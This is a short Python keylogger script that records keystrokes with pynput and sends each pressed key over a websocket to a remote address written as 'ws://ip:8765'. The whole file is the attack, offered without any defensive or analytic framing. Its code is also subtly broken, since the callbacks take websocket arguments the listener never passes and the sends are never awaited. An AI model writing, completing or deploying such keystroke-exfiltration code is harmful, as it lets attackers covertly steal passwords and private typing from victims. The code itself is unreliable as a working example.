from pynput import keyboard
import asyncio
import websockets

async def connect_to_websocket():
    uri = "ws://ip:8765"
    async with websockets.connect(uri) as websocket:
        # Collect events until released
        with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
            listener.join()

        # ...or, in a non-blocking fashion:
        listener = keyboard.Listener(on_press=on_press, on_release=on_release)
        listener.start()

def on_press(key, websocket, injected):
    try:
        websocket.send(key.char)
    except AttributeError:
        websocket.send(key)

def on_release(key, injected):
    if key == keyboard.Key.esc:
        # Stop listener
        return False


if __name__ == "__main__":
    asyncio.run(connect_to_websocket())